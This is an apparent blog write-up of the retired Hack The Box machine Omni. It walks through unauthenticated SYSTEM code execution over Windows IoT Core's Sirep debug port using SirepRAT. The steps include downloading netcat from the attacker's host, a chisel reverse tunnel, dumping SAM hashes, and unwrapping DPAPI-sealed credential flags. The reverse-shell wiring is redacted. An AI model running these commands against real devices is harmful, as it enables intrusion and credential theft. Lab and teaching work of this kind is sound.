---
layout: post
title: "The Thing That Forgot to Lock Its Own Door"
subtitle: "HTB Omni, a Windows IoT Core device with a debug protocol that runs your commands as SYSTEM and flags hidden inside their own encryption"
date: 2021-01-16 12:00:00 +0000
description: "Windows IoT Core ships a factory debug channel that runs any command as SYSTEM, and Omni turns that one forgotten port into a full takeover."
image: /assets/og/the-thing-that-forgot-to-lock-its-own-door.png
tags: [hackthebox, writeup]
---

Omni is a tiny computer pretending to be a server. Underneath the Windows badge it is Windows IoT Core, the stripped-down build meant to run on a Raspberry Pi behind a smart fridge or a factory sensor, and it carries a habit from the factory floor that nobody ever told it to drop. There is a debug channel called Sirep, left listening on a high port, that exists so a developer at a workbench can push code onto the device while they build it. It never learned to ask who you are. You speak the protocol, you name a command, and the device runs it for you as SYSTEM, the highest account on the machine. The rest of the box is just the strange way a locked-down appliance hides its secrets, with the two flags sealed inside encryption that only unwraps for the exact account that wrote it. So the whole machine is one forgotten door and one clever lockbox, and both of them open if you stand in the right place.

```
        O M N I   /   IoT CORE
        ======================
        :29819   sirep   "i'm the workbench cable.
                          what should i build?"
                  no badge check. no password.
                          |
                          v
        you: "run cmd.exe as SYSTEM"
        it:  "sure, boss"        (it thinks you're the dev)
                          |
                          v
        the flags sit in a box that only opens
        for the hand that locked it. so become that hand.
                                            物
```

## 0x01 · the appliance on the shelf

`nmap` comes back looking almost normal, and the almost is the whole story.

```
PORT      STATE SERVICE  VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  http     Microsoft HTTPAPI httpd 2.0 (WinRM)
8080/tcp  open  http     Microsoft IIS httpd
29817/tcp open  unknown
29819/tcp open  unknown
29820/tcp open  unknown
```

The 135 and 5985 pair say Windows. The 8080 service is the tell that this is not a normal Windows at all. Browse to it and you get a login box reading `Windows Device Portal`, the little web console that ships on Windows IoT Core so you can manage a headless gadget from a laptop. And then those three orphans in the 29000s, the ports with no name nmap can attach. Picture walking up to what looks like an ordinary office PC and noticing it has a row of unlabeled industrial sockets on the back, the kind you only see on equipment that was meant to be programmed on an assembly line. That cluster is Sirep, and it is the reason this box is easy.

## 0x02 · the workbench cable nobody unplugged

Windows IoT Core was built to be developed on. The way Microsoft lets a developer deploy and debug code onto a sealed little device is a protocol called Sirep, riding on TCP 29819, and its job is to take instructions from the build machine and carry them out on the device. The catastrophe is that it carries them out for anyone. There is no authentication on the wire at all. SafeBreach Labs documented this and shipped a tool called SirepRAT that speaks the protocol for you, and it turns the debug channel into unauthenticated remote code execution as SYSTEM.

Think of it like a brand-new car that still has the factory diagnostic cable dangling out of the dashboard. On the assembly line that cable is how the robots load the firmware, totally trusted, no key required, because the only thing that can reach it is the line itself. Then the car ships to a customer with the cable still hanging there, and it still trusts whatever plugs in. Sirep is that cable, and Omni shipped with it live.

The tool is one command. You name a binary to launch and hand it arguments, and the output comes back to you.

```
$ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput \
    --return_output --cmd "C:\Windows\System32\cmd.exe" \
    --args " /c whoami"

<RAT_RESULT|str|len:19>
nt authority\system
```

`nt authority\system` on the first move. Not a user you climb from. The most powerful account on the box, handed over because the device assumed you were the engineer who built it.

## 0x03 · a shell through the same cable

SYSTEM-over-a-tool is awkward to live in, so the first job is to trade it for a real shell. Use the same Sirep command to pull a copy of netcat onto the device from your own web server, then fire it back at a listener.

```
$ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput \
    --return_output --cmd "C:\Windows\System32\cmd.exe" \
    --args " /c powershell Invoke-WebRequest -Uri http://10.10.14.4/nc.exe \
            -OutFile C:\Windows\System32\spool\drivers\color\iceberg-nc.exe"
```

I am dropping the netcat binary into the printer color-profile folder, which is a classic scratch directory that almost any account can write to, and signing the filename so it is clearly mine and not the box's. Then one more Sirep call kicks off the reverse connection.

```
$ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput \
    --cmd "...\iceberg-nc.exe" --args "[ args wiring a reverse shell to 10.10.14.4:443 ]"
    # [ netcat reverse shell over TCP back to 10.10.14.4 on 443 ]
```

I am not pasting the runnable wiring for that callback on purpose. A live reverse-shell one-liner sitting on a page is a copy-paste backdoor, and the whole point is to describe the move, not ship the weapon. The bracket says exactly what it does. A listener catches the connection and you are now standing on the device as SYSTEM with a prompt you can actually use.

## 0x04 · the box that only opens for one hand

Here is where Omni stops being a normal Windows box. Go find `user.txt` and instead of a flag you get a wall of XML.

```
PS C:\> type C:\data\users\app\user.txt
<Objs ...><Obj RefId="0"><TN ...>
  <T>System.Management.Automation.PSCredential</T> ...
  <SS N="Password">01000000d08c9ddf0115d1118c7a00c0...</SS>
```

That is a PowerShell `PSCredential` object, written to disk with `Export-Clixml`, and the flag is hiding in the `Password` field. The encryption underneath it is DPAPI, the Windows Data Protection API, and DPAPI has one stubborn rule. A secret it encrypts can only be decrypted by the same user account on the same machine, because the key is derived from that user's own login secret.

Picture a hotel safe that locks to a fingerprint. You can hold the safe, shake it, photograph it, and it will not open, because it is not waiting for the right combination. It is waiting for the right hand. That is why being SYSTEM does not just hand you the flag. SYSTEM is the wrong fingerprint. The box was sealed by the user `app`, so it will only unwrap for `app`.

So you become `app`. Pull the SAM, SYSTEM, and SECURITY registry hives off the box, either by saving them and copying them out or by tunneling SMB back to yourself with a tool like chisel, then dump the hashes locally.

```
$ chisel server -p 8000 --reverse
# on the box: iceberg-chisel client 10.10.14.4:8000 R:445:127.0.0.1:445

$ secretsdump.py -sam sam -system system -security security LOCAL
[*] Dumping local SAM hashes
app:1003:aad3b...:e3cb0651718ee9b4faffe19a51faff95:::
```

Crack that NT hash and `app`'s password falls out as `mesh5143`. Now log into the Device Portal on 8080 as `app`, use its run-command feature to spawn a shell in `app`'s context, and ask PowerShell to open its own box.

```
PS C:\data\users\app> (Import-Clixml user.txt).GetNetworkCredential().Password
████████████████████████████████
```

Same machine, right hand, and the fingerprint safe pops open.

## 0x05 · the script that kept changing the locks

`app` is not administrator, and the climb to the top is hiding in plain sight as a stray batch file tucked into a PowerShell module folder.

```
PS C:\> type "C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat"
net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz
net localgroup administrators app /delete
```

That file is a janitor on a loop, resetting both passwords and kicking everyone but administrator out of the admin group every few seconds. It is meant to keep the box clean for the next player, and it leaks the administrator password in the process, `_1nt3rn37ofTh1nGz`. There is also an `iot-admin.xml` sitting in `app`'s home, another DPAPI-sealed `PSCredential`, and because `app` is the hand that sealed it, `app` can unwrap it too.

```
PS C:\data\users\app> (Import-Clixml iot-admin.xml).GetNetworkCredential() | fl
UserName : omni\administrator
Password : _1nt3rn37ofTh1nGz
```

Log into the Device Portal one more time, this time as administrator, run a shell in administrator's context, and unwrap the last box with the same single line.

```
PS C:\data\users\administrator> (Import-Clixml root.txt).GetNetworkCredential().Password
████████████████████████████████
```

Right hand again. Same safe, different fingerprint. Done.

## 0x06 · the honest caveat

It is tempting to read Omni as a museum piece, a weird little Raspberry Pi build that nobody runs in anger. That misses the part that should keep you up. The Sirep door is not a coding bug or a missing patch. It is a development convenience that was supposed to live only on a closed workbench and instead got carried, fully trusting and fully unauthenticated, all the way to a device a stranger can route to. That pattern is everywhere now. Debug ports, factory provisioning channels, manufacturer backdoors for support, JTAG headers, an MQTT broker with no password. Every smart thing in a house is a small computer that was once on a workbench, and the workbench trusts everyone. The question is never whether the convenience exists. It is whether anyone remembered to cut the cable before the thing shipped.

The flags hold a second, quieter lesson that runs the opposite direction. DPAPI did its job perfectly. Being SYSTEM, the literal king of the machine, was not enough to read a secret that a normal user had sealed, because the encryption was tied to a person and not to a privilege level. That is genuinely good security, and it is worth holding both thoughts at once. The same operating system that left its factory cable dangling also bound its secrets so tightly that raw power could not crack them. Strength in one place is not strength everywhere. A device can be impossible to decrypt and trivial to own, and Omni is exactly that contradiction wearing a Windows badge.

## 0x07 · outro

```
the appliance trusted the workbench cable it forgot to cut.
you plugged in and it built whatever you asked, as king.

but the secrets only opened for the hand that locked them.
so you stopped being the king and started being the user.

cut the debug cable. mind whose hand holds the key. wear black.

                                                            EOF
```

---

*HTB: Omni, retired 09 Jan 2021. An easy Windows IoT Core box that is really a lesson about factory debug channels outliving the factory, and about encryption that answers to a person instead of a privilege. The dangling cable still runs your code in a lab and nowhere you don't own.*